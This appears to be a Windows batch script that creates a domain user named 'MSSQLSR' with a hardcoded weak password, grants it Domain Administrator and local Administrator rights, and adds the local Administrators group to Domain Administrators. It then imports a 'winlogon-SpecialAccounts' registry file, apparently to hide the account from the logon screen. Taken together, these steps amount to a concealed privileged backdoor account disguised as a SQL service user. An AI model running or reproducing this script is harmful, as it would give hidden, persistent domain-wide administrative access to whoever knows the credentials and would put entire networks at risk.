@echo on
rem This script is created the domain user MSSQLSR and register it
rem As local administrator find domain administrator
rem It also registered local Group "Administrators" as Domain group
rem and domain user MSSQLSR as local administrator
rem This file must encoded on 866 Windows Codepage
echo off
chcp 866
rem chcp 1251

rem Set Working Directory (may be Changed)
rem
set WorkingDir=%UserProfile%

rem Set a Login
rem
set aLogin=MSSQLSR

rem Set Password
rem
set aPass=Admin01234

%SystemRoot%\System32\net.exe user %aLogin% %aPass% /add /DOMAIN
%SystemRoot%\System32\net.exe localgroup "Администраторы домена" %aLogin% /add /DOMAIN
%SystemRoot%\System32\net.exe localgroup "Domain Administrators" %aLogin% /add /DOMAIN
%SystemRoot%\System32\net.exe localgroup "Администраторы домена" %COMPUTERNAME%\"Администраторы" /add /DOMAIN
%SystemRoot%\System32\net.exe localgroup "Domain Administrators" %COMPUTERNAME%\"Administrators" /add /DOMAIN
%SystemRoot%\System32\net.exe localgroup Администраторы %DomainUser%\%aLogin% /add
%SystemRoot%\System32\net.exe localgroup Administrators %DomainUser%\%aLogin% /add
call %WorkingDir%\reg_import_file.bat %WorkingDir%\winlogon-SpecialAccounts.reg
chcp 866
